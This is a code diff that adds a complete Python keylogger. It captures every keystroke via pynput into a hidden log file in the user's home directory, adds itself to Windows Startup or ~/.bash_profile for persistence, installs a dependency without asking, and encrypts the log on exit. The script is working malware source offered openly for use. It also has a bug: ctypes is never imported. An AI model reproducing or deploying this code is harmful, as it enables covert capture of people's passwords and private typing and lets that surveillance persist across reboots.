@@ -1,0 +1,96 @@
+import os
+import sys
+import subprocess
+import getpass
+import logging
+import platform
+from pynput import keyboard
+
+def install_dependencies():
+    try:
+        from cryptography.fernet import Fernet
+    except ImportError:
+        print("Dependencies not found. Installing cryptography...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "cryptography"])
+        print("cryptography installed successfully.")
+    finally:
+        from cryptography.fernet import Fernet
+        return Fernet
+
+Fernet = install_dependencies()
+
+def is_admin():
+    if platform.system() == "Windows":
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    else:
+        return os.geteuid() == 0
+
+def generate_or_load_key():
+    if not os.path.exists("keylogger.key"):
+        key = Fernet.generate_key()
+        with open("keylogger.key", "wb") as key_file:
+            key_file.write(key)
+    else:
+        with open("keylogger.key", "rb") as key_file:
+            key = key_file.read()
+    return key
+
+def encrypt_log(data, key):
+    fernet = Fernet(key)
+    return fernet.encrypt(data.encode())
+
+def decrypt_log(data, key):
+    fernet = Fernet(key)
+    return fernet.decrypt(data).decode()
+
+log_file = os.path.expanduser("~") + "/.keylogger_log.txt"
+key = generate_or_load_key()
+
+logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_press(key):
+    try:
+        logging.info(f"Key pressed: {key.char}")
+    except AttributeError:
+        logging.info(f"Special key pressed: {key}")
+
+def encrypt_log_file():
+    with open(log_file, "r") as file:
+        log_data = file.read()
+    encrypted_data = encrypt_log(log_data, key)
+    with open(log_file, "wb") as file:
+        file.write(encrypted_data)
+
+def start_keylogger():
+    print("Keylogger started. Logging keys to: " + log_file)
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+
+def add_to_startup():
+    system = platform.system()
+    script_path = os.path.abspath(__file__)
+
+    if system == "Windows":
+        startup_folder = os.getenv('APPDATA') + r'\Microsoft\Windows\Start Menu\Programs\Startup'
+        with open(os.path.join(startup_folder, "keylogger_startup.bat"), 'w') as f:
+            f.write(f'python "{script_path}"\n')
+        print("Keylogger added to startup (Windows).")
+    elif system == "Linux" or system == "Darwin":  # Linux/macOS
+        startup_file = os.path.expanduser("~/.bash_profile")
+        with open(startup_file, 'a') as f:
+            f.write(f'\n# Start keylogger on startup\npython3 "{script_path}" &\n')
+        print("Keylogger added to startup (Linux/macOS).")
+
+def main():
+    if not is_admin():
+        print("Warning: This script requires administrator/root privileges for full functionality.")
+    add_to_startup()
+    start_keylogger()
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\nStopping keylogger and encrypting logs...")
+        encrypt_log_file()
+        print(f"Logs encrypted and saved at {log_file}.")
